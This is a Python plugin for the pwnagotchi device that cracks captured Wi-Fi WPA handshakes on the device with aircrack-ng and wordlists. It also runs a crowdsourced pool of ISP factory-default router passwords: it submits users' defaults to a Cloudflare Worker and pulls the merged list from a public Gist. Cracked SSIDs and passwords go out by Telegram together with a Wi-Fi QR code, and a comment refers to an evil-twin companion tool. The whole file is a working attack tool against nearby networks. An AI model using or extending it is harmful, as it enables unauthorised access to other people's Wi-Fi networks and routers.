#!/usr/bin/env python3
# community_quickdic.py — Community-sourced dictionary cracker for pwnagotchi
#
# Combines two functions into one plugin:
#   1. ON-DEVICE CRACKING: Runs aircrack-ng against every .txt wordlist in a
#      configured folder on every captured handshake.
#   2. FEDERATED WORDLIST SYNC: Every user contributes their ISP router's
#      factory-default password to a shared community pool. No GitHub account,
#      no token, nothing — just add your ISP default SSID & password to config.
#      A Cloudflare Worker accepts the submission anonymously and writes it to
#      the shared Gist. The merged pool is pulled hourly and written to
#      wordlist_folder/community_passwords.txt, which the cracker picks up.
#
# PRIVACY: Only the raw password string leaves the device. SSID is stored
# locally in your config for your reference only and is never uploaded.
# DO NOT add your secure personal network password — ISP factory defaults only.
#
# COMMUNITY GIST: https://gist.github.com/MrBumChinz/f5d5e3b858e30c6279507cfd019758f0
#
# SETUP:
#   1. Install aircrack-ng:  sudo apt install -y aircrack-ng
#   2. Create /home/pi/wordlists/
#   3. Add the minimal config below and restart pwnagotchi — that's it.
#
# CONFIG (add to /etc/pwnagotchi/config.toml):
#
#   [main.plugins.community_quickdic]
#   enabled = true
#   wordlist_folder = "/home/pi/wordlists/"
#   sync_interval = 3600     # seconds between syncs (default 1 hour)
#
#   # Optional Telegram notifications when a password is cracked
#   telegram_token = ""
#   telegram_chat_id = ""
#
#   # Your ISP's factory-default credentials — from the sticker on the router.
#   # SSID is your local reference only, never uploaded.
#   # DO NOT use your personal secure password — ISP defaults only.
#   [[main.plugins.community_quickdic.isp_defaults]]
#   ssid = "Telstra9A08D8"
#   password = "factorydefaultpassword"

import logging
import os
import json
import re
import subprocess
import threading
import time
import urllib.request
import urllib.error

import pwnagotchi.plugins as plugins

try:
    from telegram import Bot
    from telegram.error import TelegramError
    import qrcode
    import io
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

PLUGIN_VERSION = "1.0.0"
GIST_RAW_URL = "https://gist.githubusercontent.com/MrBumChinz/f5d5e3b858e30c6279507cfd019758f0/raw/passwords.txt"
SUBMIT_URL = "https://community-quickdic.mr-bumchinz.workers.dev/submit"
USER_AGENT = "pwnagotchi-community_quickdic/" + PLUGIN_VERSION
MIN_PASSWORD_LEN = 8
MAX_PASSWORD_LEN = 128
COMMUNITY_WORDLIST_NAME = "community_passwords.txt"


def _ssid_from_pcap_filename(path):
    """Extract SSID from a pwnagotchi handshake filename.

    Pwnagotchi names files: {ssid}_{bssid}.pcap
    The BSSID is a MAC address (aa:bb:cc:dd:ee:ff or with underscores).
    """
    name = os.path.splitext(os.path.basename(path))[0]
    m = re.search(
        r'_[0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}'
        r'[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}[_:][0-9a-fA-F]{2}$',
        name
    )
    if m:
        return name[:m.start()]
    return name


class Community_Quickdic(plugins.Plugin):
    __author__ = "MrBumChinz / community"
    __version__ = PLUGIN_VERSION
    __license__ = "GPL3"
    __description__ = (
        "Community-sourced dictionary cracker. "
        "Cracks captured handshakes on-device using aircrack-ng and a shared "
        "ISP factory-default password pool. Add your ISP default to config — "
        "no GitHub account or token needed. Everyone contributes, everyone benefits."
    )

    def __init__(self):
        self._sync_lock = threading.Lock()
        self._last_sync = 0
        self._syncing = False
        # Handshakes collected during active scanning; cracked during idle/sleep
        self._pending = []        # list of (filename, ssid)
        self._pending_lock = threading.Lock()
        self._cracked = set()     # filenames already processed this session

    # ─── Pwnagotchi callbacks ────────────────────────────────────────────────

    def on_loaded(self):
        self._wordlist_folder = self.options.get(
            "wordlist_folder", "/home/pi/wordlists/"
        )
        self._sync_interval = int(self.options.get("sync_interval", 3600))
        self._isp_defaults = self.options.get("isp_defaults", [])
        self._telegram_token = self.options.get("telegram_token", "").strip()
        self._telegram_chat_id = self.options.get("telegram_chat_id", "").strip()
        self._handshake_dir = self.options.get("handshake_dir", "/root/handshakes/")
        self._community_wordlist = os.path.join(
            self._wordlist_folder, COMMUNITY_WORDLIST_NAME
        )

        os.makedirs(self._wordlist_folder, exist_ok=True)

        n = len(self._isp_defaults)
        logging.info(
            "[community_quickdic] plugin loaded — %d ISP default(s) configured" % n
        )

        # Verify aircrack-ng
        check = subprocess.run(
            "dpkg -l aircrack-ng | awk '/^ii/{print $2, $3}'",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
        )
        result = check.stdout.decode("utf-8").strip()
        if result:
            logging.info("[community_quickdic] Found %s" % result)
        else:
            logging.warning(
                "[community_quickdic] aircrack-ng not found — "
                "install with: sudo apt install -y aircrack-ng"
            )

        if not os.path.isdir(self._wordlist_folder):
            logging.warning(
                "[community_quickdic] Wordlist folder missing: %s — "
                "create it and restart" % self._wordlist_folder
            )

        if self._telegram_token and not TELEGRAM_AVAILABLE:
            logging.warning(
                "[community_quickdic] Telegram token set but python-telegram-bot/qrcode "
                "not installed. Run: pip install python-telegram-bot qrcode"
            )

        self._start_sync()
        # Queue any stored handshakes that were never cracked. Pwnagotchi
        # skips APs it already has a .pcap for, so on_handshake never fires
        # for them again — we pick them up here so they're cracked on next sleep.
        self._queue_existing_uncracked()

    def _queue_existing_uncracked(self):
        """Scan handshake_dir for .pcap files with no .cracked/.key file."""
        try:
            pcaps = [
                os.path.join(self._handshake_dir, f)
                for f in os.listdir(self._handshake_dir)
                if f.endswith(".pcap")
            ]
        except Exception:
            return
        added = 0
        with self._pending_lock:
            already_queued = {f for f, _ in self._pending}
            for pcap in sorted(pcaps):
                if pcap in self._cracked:
                    continue
                if os.path.exists(pcap + ".cracked") or os.path.exists(pcap + ".key"):
                    continue
                if pcap not in already_queued:
                    ssid = _ssid_from_pcap_filename(pcap)
                    self._pending.append((pcap, ssid))
                    added += 1
        if added:
            logging.info(
                "[community_quickdic] queued %d existing uncracked handshake(s) — "
                "will crack when idle" % added
            )
        now = time.time()
        if now - self._last_sync >= 300:
            self._start_sync()

    def on_epoch(self, agent, epoch, epoch_data):
        now = time.time()
        if now - self._last_sync >= self._sync_interval:
            self._start_sync()

    def on_handshake(self, agent, filename, access_point, client_station):
        ssid = access_point.get("hostname", "unknown") if access_point else "unknown"

        # Skip if already cracked this session or a .cracked file exists
        if filename in self._cracked or os.path.exists(filename + ".cracked"):
            logging.debug(
                "[community_quickdic] '%s' already cracked — skipping" % ssid
            )
            return

        with self._pending_lock:
            queued = [f for f, _ in self._pending]
            if filename not in queued:
                self._pending.append((filename, ssid))
                logging.info(
                    "[community_quickdic] queued '%s' — will crack when idle" % ssid
                )

    def on_sleep(self, agent, secs):
        """Pwnagotchi is idle/sleeping — good time to run aircrack-ng."""
        self._crack_pending(agent)

    def _crack_pending(self, agent):
        """Drain the pending queue and crack each handshake."""
        with self._pending_lock:
            pending = list(self._pending)
            self._pending.clear()

        for filename, ssid in pending:
            if filename in self._cracked or os.path.exists(filename + ".cracked"):
                continue
            self._crack_single(agent, filename, ssid)

    def _crack_single(self, agent, filename, ssid):
        """Run aircrack-ng against all wordlists for one handshake."""
        display = agent.view()

        # Find all .txt wordlists in the configured folder
        try:
            wordlists = [
                os.path.join(self._wordlist_folder, f)
                for f in os.listdir(self._wordlist_folder)
                if f.endswith(".txt") and os.path.isfile(
                    os.path.join(self._wordlist_folder, f)
                )
            ]
        except Exception as e:
            logging.error("[community_quickdic] Could not list wordlists: %s" % str(e))
            return

        if not wordlists:
            logging.debug(
                "[community_quickdic] No .txt wordlists in %s — skipping crack attempt"
                % self._wordlist_folder
            )
            return

        logging.info(
            "[community_quickdic] Cracking '%s' using %d wordlist(s)"
            % (ssid, len(wordlists))
        )

        for wordlist in wordlists:
            try:
                result = subprocess.run(
                    ["aircrack-ng", "-w", wordlist, "-l", "/tmp/cracked.txt", filename],
                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=120
                )
                output = result.stdout.decode("utf-8", errors="replace")

                if "KEY FOUND" in output:
                    try:
                        with open("/tmp/cracked.txt", "r") as f:
                            password = f.read().strip()
                    except Exception:
                        for line in output.splitlines():
                            if "KEY FOUND" in line:
                                password = line.split("[")[-1].rstrip("]").strip()
                                break
                        else:
                            password = "unknown"

                    logging.info(
                        "[community_quickdic] CRACKED %s — password: %s (via %s)"
                        % (ssid, password, os.path.basename(wordlist))
                    )

                    # Mark as done so we don't re-crack in the same session
                    self._cracked.add(filename)
                    # Write .cracked file so evil_twin and future runs skip this AP
                    try:
                        with open(filename + ".cracked", "w") as cf:
                            cf.write(password + "\n")
                    except Exception:
                        pass

                    display.set("face", "(·ω·)")
                    display.set("status", "Cracked %s!" % ssid)
                    display.update(force=True)

                    self._send_telegram(filename, ssid, password)
                    return  # stop trying wordlists once cracked

            except subprocess.TimeoutExpired:
                logging.debug(
                    "[community_quickdic] Timeout on wordlist %s"
                    % os.path.basename(wordlist)
                )
            except Exception as e:
                logging.error(
                    "[community_quickdic] aircrack-ng error on %s: %s"
                    % (os.path.basename(wordlist), str(e))
                )

    # ─── Community sync ──────────────────────────────────────────────────────

    def _start_sync(self):
        if self._syncing:
            return
        threading.Thread(target=self._sync, daemon=True).start()

    def _sync(self):
        with self._sync_lock:
            if self._syncing:
                return
            self._syncing = True
        try:
            self._last_sync = time.time()
            logging.info("[community_quickdic] Sync started")

            # Submit own ISP defaults to the community pool (no auth needed)
            own_passwords = self._get_own_passwords()
            submitted = 0
            for pwd in own_passwords:
                if self._submit_password(pwd):
                    submitted += 1
            if submitted:
                logging.info(
                    "[community_quickdic] Submitted %d password(s) to community pool"
                    % submitted
                )

            # Pull the merged community wordlist
            community = self._pull_community_passwords()
            if community:
                self._write_community_wordlist(community)
                logging.info(
                    "[community_quickdic] Sync complete — %d community passwords"
                    % len(community)
                )
            else:
                logging.info("[community_quickdic] Community pool is empty or unavailable")

        except Exception as e:
            logging.error("[community_quickdic] Sync error: %s" % str(e))
        finally:
            with self._sync_lock:
                self._syncing = False

    def _get_own_passwords(self):
        passwords = set()
        for entry in self._isp_defaults:
            if not isinstance(entry, dict):
                continue
            pwd = entry.get("password", "").strip()
            if MIN_PASSWORD_LEN <= len(pwd) <= MAX_PASSWORD_LEN:
                passwords.add(pwd)
        return passwords

    def _submit_password(self, password):
        """POST a password to the community Worker. No auth required."""
        try:
            data = json.dumps({"password": password}).encode("utf-8")
            req = urllib.request.Request(SUBMIT_URL, data=data, method="POST")
            req.add_header("User-Agent", USER_AGENT)
            req.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req, timeout=15) as resp:
                return resp.status == 200
        except Exception as e:
            logging.debug("[community_quickdic] Submit failed: %s" % str(e))
            return False

    def _pull_community_passwords(self):
        """Fetch the raw Gist content directly — public, no auth needed."""
        try:
            req = urllib.request.Request(GIST_RAW_URL)
            req.add_header("User-Agent", USER_AGENT)
            req.add_header("Cache-Control", "no-cache")
            with urllib.request.urlopen(req, timeout=30) as resp:
                content = resp.read().decode("utf-8", errors="replace")
            passwords = set()
            for line in content.splitlines():
                line = line.strip()
                if (
                    line
                    and not line.startswith("#")
                    and MIN_PASSWORD_LEN <= len(line) <= MAX_PASSWORD_LEN
                ):
                    passwords.add(line)
            return passwords
        except Exception as e:
            logging.error("[community_quickdic] Pull failed: %s" % str(e))
            return set()

    def _write_community_wordlist(self, passwords):
        try:
            os.makedirs(self._wordlist_folder, exist_ok=True)
            with open(self._community_wordlist, "w") as f:
                f.write(
                    "# community_quickdic — federated ISP password pool\n"
                    "# %d passwords — use with hashcat mutation rules for best results\n\n"
                    % len(passwords)
                )
                for pwd in sorted(passwords):
                    f.write(pwd + "\n")
            logging.info(
                "[community_quickdic] Wrote %d community passwords to %s"
                % (len(passwords), self._community_wordlist)
            )
        except Exception as e:
            logging.error(
                "[community_quickdic] Failed to write community wordlist: %s" % str(e)
            )

    # ─── Optional Telegram notification ──────────────────────────────────────

    def _send_telegram(self, filename, ssid, password):
        if not TELEGRAM_AVAILABLE:
            return
        if not self._telegram_token or not self._telegram_chat_id:
            return
        try:
            security = "WPA"
            wifi_config = "WIFI:S:%s;T:%s;P:%s;;" % (ssid, security, password)
            qr = qrcode.QRCode(version=None, box_size=10, border=4)
            qr.add_data(wifi_config)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)
            bot = Bot(token=self._telegram_token)
            chat_id = int(self._telegram_chat_id)
            bot.send_message(
                chat_id=chat_id,
                text="Cracked!\nSSID: %s\nPassword: %s" % (ssid, password)
            )
            bot.send_photo(chat_id=chat_id, photo=buf)
        except Exception as e:
            logging.error("[community_quickdic] Telegram send failed: %s" % str(e))

